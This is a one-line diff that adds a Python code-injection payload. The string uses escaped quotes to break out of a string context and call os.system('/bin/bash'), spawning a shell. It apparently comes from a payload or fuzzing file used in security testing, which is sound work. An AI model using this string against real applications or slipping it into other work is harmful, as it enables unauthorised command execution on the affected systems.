@@ -1,0 +1,1 @@
+"\x22,__import__('os').system('/bin/bash'),\x22"
